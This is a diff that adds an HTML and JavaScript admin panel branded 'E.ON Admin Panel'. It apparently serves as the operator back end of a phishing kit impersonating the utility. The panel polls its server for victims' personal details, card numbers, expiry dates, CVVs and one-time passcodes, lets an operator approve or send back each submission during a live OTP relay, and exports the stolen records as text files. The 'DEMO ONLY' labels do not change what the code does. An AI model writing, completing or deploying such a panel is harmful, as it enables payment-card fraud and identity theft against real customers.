@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - E.ON Submissions</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+        body { background-color: #111827; color: #d1d5db; font-family: 'Roboto', sans-serif; }
+        .card { background-color: #1f2937; border-color: #374151; }
+        .btn { padding: 8px 16px; border-radius: 6px; font-weight: bold; color: white; transition: background-color 0.2s; }
+        .btn-approve { background-color: #16a34a; }
+        .btn-approve:hover { background-color: #15803d; }
+        .btn-reject { background-color: #dc2626; }
+        .btn-reject:hover { background-color: #b91c1c; }
+        .btn-download { background-color: #3b82f6; }
+        .btn-download:hover { background-color: #2563eb; }
+        .status-approved { color: #34d399; }
+        .status-rejected { color: #f87171; }
+        .archive-table { width: 100%; border-collapse: collapse; font-size: 0.875rem; }
+        /* EDITED PADDING HERE */
+        .archive-table th, .archive-table td { padding: 6px 10px; text-align: left; border-bottom: 1px solid #374151; }
+        .archive-table th { background-color: #374151; color: #ffffff; }
+        .archive-table tr:nth-child(even) { background-color: #1f2937; }
+        .archive-table tr:nth-child(odd) { background-color: #263142; }
+    </style>
+</head>
+<body>
+    <div class="container mx-auto p-4 md:p-8">
+        <!-- EDITED FONT SIZE HERE -->
+        <h1 class="text-2xl font-bold text-white mb-4">E.ON Admin Panel</h1>
+        
+        <!-- EDITED FONT SIZE HERE -->
+        <h2 class="text-lg font-semibold text-white mb-4 border-b border-gray-700 pb-2">Pending Action</h2>
+        <!-- THIS DIV WILL NOW HOLD MULTIPLE CARDS -->
+        <div id="submission-container" class="space-y-6">
+            <!-- Current pending submissions will be loaded here -->
+        </div>
+        <p id="no-submission-message" class="text-gray-400">Waiting for a new submission...</p>
+
+        <div class="flex justify-between items-center mt-12 mb-4 border-b border-gray-700 pb-2">
+            <!-- EDITED FONT SIZE HERE -->
+            <h2 class="text-lg font-semibold text-white">Archive</h2>
+            <button id="download-archive-btn" class="btn btn-download text-sm">Download Full Archive</button>
+        </div>
+        <div id="archive-container" class="overflow-x-auto">
+            <p id="no-archive-message" class="text-gray-400">No archived submissions yet.</p>
+            <!-- Archived submissions table will be loaded here -->
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const submissionContainer = document.getElementById('submission-container');
+            const noSubmissionMessage = document.getElementById('no-submission-message');
+            const archiveContainer = document.getElementById('archive-container');
+            const noArchiveMessage = document.getElementById('no-archive-message');
+            const downloadArchiveBtn = document.getElementById('download-archive-btn');
+
+            let fullArchiveData = [];
+
+            // --- THIS FUNCTION HAS BEEN EDITED ---
+            async function fetchSubmission() {
+                try {
+                    const response = await fetch('/submission');
+                    const submissions = await response.json(); // Now expects a list (array)
+
+                    // Clear the container before adding new cards
+                    submissionContainer.innerHTML = '';
+
+                    if (submissions && submissions.length > 0) {
+                        noSubmissionMessage.style.display = 'none';
+                        
+                        // Loop through each pending submission and create a card
+                        submissions.forEach(submission => {
+                            const card = document.createElement('div');
+                            card.className = 'card p-4 md:p-6 rounded-lg border'; // Adjusted padding
+                            // EDITED FONT SIZES IN THIS BLOCK
+                            card.innerHTML = `
+                                <h3 class="text-base font-bold text-white">${submission.firstName || ''} ${submission.lastName || ''}</h3>
+                                <p class="text-xs text-gray-400">${submission.email || ''}</p>
+                                <div class="mt-4 pt-4 border-t border-gray-700 grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
+                                    <div><h4 class="font-bold text-sm text-white mb-2">Personal & Address</h4><p><strong>Bill Number:</strong> ${submission.billNumber || '-'}</p><p><strong>Phone:</strong> ${submission.phone || '-'}</p><p><strong>Address:</strong> ${submission.street || ''} ${submission.houseNr || ''}, ${submission.deliveryAddress || ''}</p></div>
+                                    <div><h4 class="font-bold text-sm text-white mb-2">Payment Details</h4><p class="text-red-400"><strong>DEMO ONLY</strong></p><p><strong>Card Holder:</strong> ${submission.cardHolder || '-'}</p><p><strong>Card Number:</strong> ${submission.cardNumber || '-'}</p><p><strong>Expiry:</strong> ${submission.expiryDate || '-'}</p><p><strong>CVV:</strong> ${submission.cvv || '-'}</p><p class="font-bold text-base text-yellow-400 mt-2">OTP Code: ${submission.otp || 'Waiting for user...'}</p><p class="font-bold text-base text-white mt-2">Amount: ${submission.totalAmount || '0.00'} EUR</p></div>
+                                </div>
+                                <div class="mt-6 pt-4 border-t border-gray-700 flex space-x-4">
+                                    <button class="btn btn-approve text-sm" onclick="updateStatus('${submission.id}', 'approved')">Approve</button>
+                                    <button class="btn btn-reject text-sm" onclick="updateStatus('${submission.id}', 'rejected')">Send Back (Reject)</button>
+                                </div>`;
+                            submissionContainer.appendChild(card);
+                        });
+
+                    } else {
+                        noSubmissionMessage.style.display = 'block';
+                    }
+                } catch (error) {
+                    noSubmissionMessage.textContent = 'Could not connect to the server. Is it running?';
+                }
+            }
+
+            async function fetchArchive() {
+                try {
+                    const response = await fetch('/archive');
+                    const archived = await response.json();
+                    fullArchiveData = archived;
+                    
+                    if (archived && archived.length > 0) {
+                        noArchiveMessage.style.display = 'none';
+                        let tableHTML = `<table class="archive-table rounded-lg overflow-hidden"><thead><tr><th>Date</th><th>Bill Number</th><th>Name</th><th>Amount</th><th>OTP</th><th>Card Holder</th><th>Status</th><th>Action</th></tr></thead><tbody>`;
+                        archived.forEach(sub => {
+                            tableHTML += `
+                                <tr>
+                                    <td>${sub.timestamp || 'N/A'}</td>
+                                    <td>${sub.billNumber || '-'}</td>
+                                    <td>${sub.firstName || ''} ${sub.lastName || ''}</td>
+                                    <td>${sub.totalAmount || '0.00'} EUR</td>
+                                    <td>${sub.otp || '-'}</td>
+                                    <td>${sub.cardHolder || '-'}</td>
+                                    <td class="font-bold status-${sub.status}">${sub.status.toUpperCase()}</td>
+                                    <td><button class="btn btn-download text-xs" onclick="downloadSingle('${sub.id}')">Download</button></td>
+                                </tr>`;
+                        });
+                        tableHTML += `</tbody></table>`;
+                        archiveContainer.innerHTML = tableHTML;
+                    } else {
+                        noArchiveMessage.style.display = 'block';
+                        archiveContainer.innerHTML = '';
+                    }
+                } catch (error) {
+                    noArchiveMessage.textContent = 'Could not fetch archive.';
+                }
+            }
+
+            // --- THIS FUNCTION HAS BEEN EDITED ---
+            window.updateStatus = async (id, newStatus) => {
+                try {
+                    await fetch('/update-status', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: id, status: newStatus }),
+                    });
+                    fetchSubmission();
+                    fetchArchive();
+                } catch (error) {
+                    alert('Could not update status. Is the server running?');
+                }
+            }
+            
+            window.downloadSingle = (id) => {
+                const submission = fullArchiveData.find(sub => sub.id === id);
+                if (submission) {
+                    const textContent = formatSubmissionAsText(submission);
+                    triggerDownload(textContent, `submission-${submission.lastName}-${submission.id}.txt`);
+                }
+            };
+
+            downloadArchiveBtn.addEventListener('click', () => {
+                if (fullArchiveData.length > 0) {
+                    let fullTextContent = "E.ON Full Submission Archive\n=============================\n\n";
+                    fullArchiveData.forEach(sub => {
+                        fullTextContent += formatSubmissionAsText(sub) + "\n---------------------------------\n\n";
+                    });
+                    triggerDownload(fullTextContent, 'full-archive.txt');
+                } else {
+                    alert('There is no data in the archive to download.');
+                }
+            });
+
+            function formatSubmissionAsText(submission) {
+                return `
+Submission ID: ${submission.id}
+Timestamp: ${submission.timestamp}
+Status: ${submission.status.toUpperCase()}
+
+--- Personal Details ---
+Bill Number: ${submission.billNumber || '-'}
+Name: ${submission.firstName || ''} ${submission.lastName || ''}
+Email: ${submission.email || '-'}
+Phone: ${submission.phone || '-'}
+Date of Birth: ${submission.dob || '-'}
+
+--- Address ---
+Street: ${submission.street || ''} ${submission.houseNr || ''}
+City/ZIP: ${submission.deliveryAddress || ''}
+
+--- Payment Details (DEMO ONLY) ---
+Total Amount: ${submission.totalAmount || '0.00'} EUR
+Card Holder: ${submission.cardHolder || '-'}
+Card Number: ${submission.cardNumber || '-'}
+Expiry: ${submission.expiryDate || '-'}
+CVV: ${submission.cvv || '-'}
+OTP Code: ${submission.otp || '-'}
+                `.trim();
+            }
+
+            function triggerDownload(content, fileName) {
+                const element = document.createElement('a');
+                element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(content));
+                element.setAttribute('download', fileName);
+                element.style.display = 'none';
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
+            }
+
+            setInterval(() => {
+                fetchSubmission();
+                fetchArchive();
+            }, 3000);
+            fetchSubmission();
+            fetchArchive();
+        });
+    </script>
+</body>
+</html>
